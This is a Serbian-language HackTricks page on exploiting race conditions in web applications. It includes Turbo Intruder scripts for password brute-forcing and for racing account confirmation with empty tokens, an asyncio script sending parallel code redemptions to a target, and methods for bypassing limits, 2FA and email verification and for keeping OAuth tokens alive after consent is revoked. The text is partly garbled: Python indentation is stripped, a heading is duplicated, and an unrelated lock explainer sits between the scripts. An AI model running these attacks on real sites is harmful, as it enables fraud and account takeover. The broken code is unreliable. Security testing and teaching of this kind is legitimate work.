# Trka캜ki uslov

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** koji se pokre캖u najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **ogla코avanje va코e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

{% hint style="warning" %}
Da biste duboko razumeli ovu tehniku, proverite originalni izve코taj na [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Unapre캠ivanje napada trka캜kog uslova

Glavna prepreka u iskori코캖avanju trka캜kog uslova je osigurati da se vi코e zahteva obra캠uje istovremeno, sa **vrlo malom razlikom u vremenu obrade - idealno manje od 1ms**.

Ovde mo쬰te prona캖i neke tehnike za sinhronizaciju zahteva:

#### Napad jednim paketom HTTP/2 protiv sinhronizacije poslednjeg bajta HTTP/1.1

- **HTTP/2**: Podr쬬va slanje dva zahteva preko jedne TCP konekcije, smanjuju캖i uticaj mre쬹og ka코njenja. Me캠utim, zbog varijacija na serverskoj strani, dva zahteva mo쬯a nisu dovoljna za dosledno iskori코캖avanje trka캜kog uslova.
- **HTTP/1.1 'Last-Byte Sync'**: Omogu캖ava prethodno slanje ve캖ine delova 20-30 zahteva, zadr쬬vaju캖i mali fragment koji se zatim 코alje zajedno, posti쬿캖i istovremeni dolazak na server.

**Priprema za sinhronizaciju poslednjeg bajta** uklju캜uje:
1. Slanje zaglavlja i podataka tela bez poslednjeg bajta bez zavr코etka toka.
2. Zaustavljanje na 100ms nakon po캜etnog slanja.
3. Onemogu캖avanje TCP_NODELAY da bi se koristio Naglov algoritam za grupisanje kona캜nih okvira.
4. Pingovanje za zagrevanje veze.

Naknadno slanje zadr쬬nih okvira trebalo bi rezultirati njihovim dolaskom u jednom paketu, 코to se mo쬰 proveriti putem Wireshark-a. Ova metoda se ne primenjuje na stati캜ke datoteke koje obi캜no nisu uklju캜ene u napade trka캜kog uslova.

### Prilago캠avanje serverske arhitekture

Razumevanje arhitekture cilja je klju캜no. Serveri na prednjoj strani mogu usmeravati zahteve na razli캜ite na캜ine, 코to uti캜e na vreme. Preemptivno zagrevanje serverske veze, putem nebitnih zahteva, mo쬰 normalizovati vreme zahteva.

#### Prevazila쬰nje zaklju캜avanja na osnovu sesije

Okviri kao 코to je PHP-ov rukovalac sesijama serijski obra캠uju zahteve po sesiji, 코to potencijalno prikriva ranjivosti. Kori코캖enje razli캜itih sesijskih tokena za svaki zahtev mo쬰 zaobi캖i ovaj problem.

#### Prevazila쬰nje ograni캜enja brzine ili resursa

Ako zagrevanje veze nije efikasno, namerno izazivanje ka코njenja ograni캜enja brzine ili resursa veb servera putem poplave la쬹ih zahteva mo쬰 olak코ati napad jednim paketom stvaranjem ka코njenja na serverskoj strani pogodnog za trka캜ke uslove.


## Primeri napada

* **Tubo Intruder - napad jednim paketom HTTP2 (1 endpoint)**: Mo쬰te poslati zahtev na **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), mo쬰te promeniti vrednost koju 쬰lite da probate metodom "brute force" za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, a zatim izabrati **`examples/race-single-packer-attack.py`** iz padaju캖eg menija:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako 쬰lite da **po코aljete razli캜ite vrednosti**, mo쬰te izmeniti kod sa ovim koji koristi listu re캜i sa clipboard-a:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Ako veb ne podr쬬va HTTP2 (samo HTTP1.1), umesto `Engine.BURP2` koristite `Engine.THREADED` ili `Engine.BURP`.
{% endhint %}

* **Tubo Intruder - Napad jednim paketom HTTP2 (Vi코e krajnjih ta캜aka)**: U slu캜aju da trebate poslati zahtev na jednu krajnju ta캜ku, a zatim vi코e zahteva na druge krajnje ta캜ke kako biste pokrenuli RCE, mo쬰te promeniti skriptu `race-single-packet-attack.py` na ne코to poput:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tako캠e je dostupno u **Repeater-u** putem nove opcije '**Paralelno slanje grupe**' u Burp Suite-u.
* Za **prekora캜enje ograni캜enja** jednostavno mo쬰te dodati **istu zahtev 50 puta** u grupu.
* Za **zagrevanje konekcije**, mo쬰te **dodati** na **po캜etak grupe** neke zahteve ka delu veb servera koji nije stati캜an.
* Za **odlaganje** procesa **izme캠u** obrade **jednog zahteva i drugog** u 2 podstanja koraka, mo쬰te **dodati dodatne zahteve izme캠u** oba zahteva.
* Za vi코e krajnjih ta캜aka RC-a mo쬰te po캜eti slanje **zahteva** koji **ide ka skrivenom stanju** i zatim **50 zahteva** odmah nakon toga koji **eksploati코u skriveno stanje**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Sirovi BF

Prethodno istra쬴vanje je koristilo ove payload-e koji su samo poku코avali da po코alju pakete 코to je br쬰 mogu캖e kako bi izazvali RC.

* **Repeater:** Pogledajte primere iz prethodne sekcije.
* **Intruder**: Po코aljite **zahtev** Intruder-u, postavite **broj niti** na **30** unutar menija **Opcije**, izaberite kao payload **Null payloads** i generi코ite **30**.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**

* **Python - asyncio**

Python - asyncio je biblioteka koja omogu캖ava asinhrono izvr코avanje koda. To je korisno za rukovanje trka캜kim uslovima u veb aplikacijama.

Da biste iskoristili asyncio, morate koristiti `async` i `await` klju캜ne re캜i. `async` se koristi za definisanje asinhronih funkcija, dok se `await` koristi za 캜ekanje na zavr코etak asinhronih operacija.

Kada se koristi asyncio, mo쬰te koristiti `asyncio.Lock()` objekat za sinhronizaciju pristupa deljenim resursima. Ovaj objekat obezbe캠uje da samo jedan proces mo쬰 pristupiti resursu u isto vreme.

Evo primera koda koji koristi asyncio za rukovanje trka캜kim uslovima:

```python
import asyncio

async def access_resource(lock):
    await lock.acquire()
    try:
        # Ovde se vr코i pristup deljenom resursu
        print("Pristupam deljenom resursu...")
        await asyncio.sleep(1)
        print("Zavr코io sam pristup deljenom resursu.")
    finally:
        lock.release()

async def main():
    lock = asyncio.Lock()
    tasks = []
    for _ in range(5):
        tasks.append(access_resource(lock))
    await asyncio.gather(*tasks)

asyncio.run(main())
```

U ovom primeru, `access_resource()` funkcija koristi `lock.acquire()` da bi se osiguralo da samo jedan proces mo쬰 pristupiti deljenom resursu u isto vreme. Nakon pristupa resursu, funkcija 캜eka 1 sekundu koriste캖i `asyncio.sleep()` i zatim osloba캠a zaklju캜avanje pomo캖u `lock.release()`.

`main()` funkcija kreira `asyncio.Lock()` objekat i pokre캖e pet instanci `access_resource()` funkcije koriste캖i `asyncio.gather()`.

Kada se ovaj kod izvr코i, svaka instanca `access_resource()` funkcije 캖e se izvr코iti asinhrono, ali 캖e biti sinhronizovane kori코캖enjem `asyncio.Lock()` objekta. Ovo osigurava da samo jedan proces mo쬰 pristupiti deljenom resursu u isto vreme, spre캜avaju캖i trka캜ke uslove.
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologija RC-a**

### Prekora캜enje ograni캜enja / TOCTOU

Ovo je najosnovniji tip trke uslova gde se **ranjivosti** pojavljuju na mestima koja **ograni캜avaju broj puta kada mo쬰te izvr코iti odre캠enu radnju**. Na primer, kori코캖enje istog koda za popust nekoliko puta u veb prodavnici. Veoma jednostavan primer mo쬰 se prona캖i u [**ovom izve코taju**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**ovom bagu**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ovakvih napada, uklju캜uju캖i:

* Vi코estruko iskori코캖avanje poklon kartice
* Vi코estruko ocenjivanje proizvoda
* Podizanje ili prenos gotovine preko iznosa na ra캜unu
* Ponovno kori코캖enje jedinstvenog re코enja CAPTCHA
* Zaobila쬰nje ograni캜enja brzine protiv brute-force napada

### **Skriveni podstanja**

Iskori코캖avanje slo쬰nih trka uslova 캜esto uklju캜uje iskori코캖avanje kratkih prilika za interakciju sa skrivenim ili **nenamernim podstanjima ma코ine**. Evo kako pristupiti ovome:

1. **Identifikujte potencijalna skrivena podstanja**
- Po캜nite tako 코to 캖ete identifikovati krajnje ta캜ke koje menjaju ili interaguju sa kriti캜nim podacima, kao 코to su korisni캜ki profili ili procesi za resetovanje lozinke. Fokusirajte se na:
- **Skladi코tenje**: Dajte prednost krajnjim ta캜kama koje manipuli코u podacima na serveru u odnosu na one koje rukuju podacima na klijentskoj strani.
- **Radnja**: Potra쬴te operacije koje menjaju postoje캖e podatke, jer su one verovatnije da 캖e stvoriti iskori코캖ive uslove u pore캠enju sa operacijama koje dodaju nove podatke.
- **Klju캜evi**: Uspe코ni napadi obi캜no uklju캜uju operacije koje se klju캜e na isti identifikator, na primer korisni캜ko ime ili token za resetovanje.

2. **Sprovedite po캜etno ispitivanje**
- Testirajte identifikovane krajnje ta캜ke sa napadima trke uslova, posmatraju캖i bilo kakve odstupanja od o캜ekivanih rezultata. Neo캜ekivani odgovori ili promene u pona코anju aplikacije mogu ukazivati na ranjivost.

3. **Poka쬴te ranjivost**
- Su쬴te napad na minimalan broj zahteva potrebnih za iskori코캖avanje ranjivosti, 캜esto samo dva. Ovaj korak mo쬰 zahtevati vi코e poku코aja ili automatizaciju zbog preciznog vremenskog uskla캠ivanja.

### Napadi osetljivi na vreme

Preciznost u vremenskom slanju zahteva mo쬰 otkriti ranjivosti, posebno kada se koriste predvidljive metode poput vremenskih oznaka za sigurnosne tokene. Na primer, generisanje tokena za resetovanje lozinke na osnovu vremenskih oznaka mo쬰 omogu캖iti identi캜ne tokene za istovremene zahteve.

**Da biste iskoristili:**
- Koristite precizno vremensko slanje, poput napada sa jednim paketom, kako biste izvr코ili istovremene zahteve za resetovanje lozinke. Identi캜ni tokeni ukazuju na ranjivost.

**Primer:**
- Zatra쬴te dva tokena za resetovanje lozinke istovremeno i uporedite ih. Podudaraju캖i tokeni ukazuju na gre코ku u generisanju tokena.

**Proverite ovaj [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) da biste isprobali ovo.**


## Studije slu캜aja skrivenih podstanja

### Pla캖anje i dodavanje stavke

Proverite ovaj [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da biste videli kako **platiti** u prodavnici i **dodati dodatnu** stavku koju **ne캖ete morati platiti**.

### Potvrda drugih e-po코ta

Ideja je **verifikovati adresu e-po코te i istovremeno je promeniti u drugu** kako biste saznali da li platforma verifikuje novu adresu.

### Promena e-po코te na 2 adrese zasnovana na kola캜i캖ima

Prema [**ovom istra쬴vanju**](https://portswigger.net/research/smashing-the-state-machine), Gitlab je bio ranjiv na preuzimanje na ovaj na캜in jer bi mogao **poslati** **token za verifikaciju e-po코te jedne adrese na drugu adresu**.

**Proverite ovaj [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) da biste isprobali ovo.**

### Skrivena stanja baze podataka / Zaobila쬰nje potvrde

Ako se koriste **2 razli캜ita upisa** za **dodavanje** **informacija** u bazu podataka, postoji mali vremenski period kada je **samo prvi podatak upisan** u bazu podataka. Na primer, prilikom kreiranja korisnika, **korisni캜ko ime** i **lozinka** mogu biti **upisani**, a zatim se upisuje token za potvrdu novo kreiranog naloga. To zna캜i da je tokom kratkog vremena **token za potvrdu naloga prazan**.

Stoga, **registrovanje naloga i slanje nekoliko zahteva sa praznim tokenom** (`token=` ili `token[]=` ili bilo koja druga varijacija) za odmah potvr캠ivanje naloga mo쬰 omogu캖iti **potvrdu naloga** gde ne kontroli코ete e-po코tu.

**Proverite ovaj [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) da biste isprobali ovo.**

### Zaobila쬰nje dvofaktorne autentifikacije

Slede캖i pseudo-kod je ranjiv na trku uslova jer u vrlo kratkom vremenskom periodu **dvofaktorna autentifikacija nije primenjena** dok se sesija kreira:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Ve캜na postojanost OAuth2

Postoji nekoliko [**OAuth provajdera**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ovi servisi 캖e vam omogu캖iti da kreirate aplikaciju i autentifikujete korisnike koje je provajder registrovao. Da biste to uradili, **klijent** 캖e morati da **dozvoli va코oj aplikaciji** pristup nekim od njihovih podataka unutar **OAuth provajdera**-a.\
Dakle, do sada samo uobi캜ajena prijava putem google/linkedin/github... gde vam se prikazuje stranica sa porukom: "_Aplikacija \<InsertCoolName> 쬰li da pristupi va코im informacijama, da li 쬰lite da to dozvolite?_"

#### Trka캜ka situacija u `authorization_code`

**Problem** se javlja kada ga **prihvatite** i automatski 코alje **`authorization_code`** zlonamerno aplikaciji. Zatim, ova aplikacija zloupotrebljava trka캜ku situaciju u OAuth servis provajderu da generi코e vi코e od jednog AT/RT (_Authentication Token/Refresh Token_) iz **`authorization_code`** za va코 nalog. U osnovi, zloupotrebi캖e 캜injenicu da ste prihvatili aplikaciju da pristupi va코im podacima da bi **kreirala nekoliko naloga**. Zatim, ako **prestane da dozvoljava aplikaciji pristup va코im podacima, jedan par AT/RT 캖e biti obrisan, ali ostali 캖e i dalje biti validni**.

#### Trka캜ka situacija u `Refresh Token`

Kada ste **dobili validan RT**, mo쬰te poku코ati da ga zloupotrebite da biste generisali nekoliko AT/RT-a i **캜ak ako korisnik otka쬰 dozvole** za zlonamernu aplikaciju da pristupi njegovim podacima, **nekoliko RT-ova 캖e i dalje biti validno**.

## **RC u WebSockets**

U [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) mo쬰te prona캖i PoC u Javi za slanje websocket poruka **paralelno** kako biste zloupotrebili **trka캜ke situacije i u Web Sockets**-ima.

## Reference

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **ogla코avanje va코e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomo캖 najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
